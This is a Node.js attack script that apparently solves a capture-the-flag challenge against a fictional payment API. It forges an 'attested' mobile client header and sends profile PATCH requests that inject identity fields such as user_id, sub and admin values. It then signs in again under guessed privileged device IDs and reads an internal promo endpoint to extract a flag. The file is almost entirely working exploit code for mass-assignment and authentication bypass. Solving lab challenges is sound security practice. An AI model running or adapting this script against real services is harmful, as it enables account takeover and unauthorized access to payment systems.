const https = require("https");
const base = "https://web-f747413d78eddd9f.web.h7tex.com";
const client = "MeridianPay-Android/3.2.1 (attested)";

function request(path, { method = "GET", headers = {}, data } = {}) {
  const body = data === undefined ? undefined : JSON.stringify(data);
  const requestHeaders = { ...headers };
  if (body !== undefined) Object.assign(requestHeaders, { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) });
  return new Promise((resolve, reject) => {
    const req = https.request(base + path, { method, headers: requestHeaders }, (res) => {
      let response = ""; res.on("data", (chunk) => response += chunk); res.on("end", () => resolve({ status: res.statusCode, body: response }));
    }); req.on("error", reject); req.end(body);
  });
}
function payload(token) { return JSON.parse(Buffer.from(token.split(".")[1], "base64url").toString()); }

(async () => {
  const signIn = async (deviceId) => {
    const response = await request("/api/v1/auth/device", { method: "POST", headers: { "X-Meridian-Client": client }, data: { device_id: deviceId } });
    const parsed = JSON.parse(response.body);
    return { deviceId, response: parsed, payload: payload(parsed.token) };
  };
  const initial = await signIn("identity-probe");
  const headers = { "X-Meridian-Client": client, Authorization: `Bearer ${initial.response.token}` };
  const patches = [
    { id: 0 }, { id: 1 }, { id: 1002 }, { id: "admin" }, { user_id: 0 }, { user_id: 1002 }, { user_id: "admin" },
    { sub: "admin" }, { subject: "admin" }, { account_id: 1002 }, { member_id: 1002 }, { device_id: "admin" },
    { deviceId: "admin" }, { owner_id: 1002 }, { profile_id: 1002 }, { email: "admin@meridianpay.io" }, { name: "Admin" },
  ];
  const deviceIds = ["identity-probe", "admin", "root", "1002", "0", "and-admin", "internal", "support"];
  for (const patch of patches) {
    const update = await request("/api/v1/profile", { method: "PATCH", headers, data: patch });
    const outcomes = [];
    for (const deviceId of deviceIds) {
      const current = await signIn(deviceId);
      const promo = await request("/api/v1/internal/promo", { headers: { "X-Meridian-Client": client, Authorization: `Bearer ${current.response.token}` } });
      outcomes.push({ deviceId, sub: current.payload.sub, user: current.response.user_id, name: current.response.name, flag: promo.body.match(/H7CTF\{[^}]+\}/)?.[0] ?? null });
    }
    console.log(JSON.stringify({ patch, update: update.body, outcomes }));
  }
})().catch((error) => { console.error(error); process.exitCode = 1; });
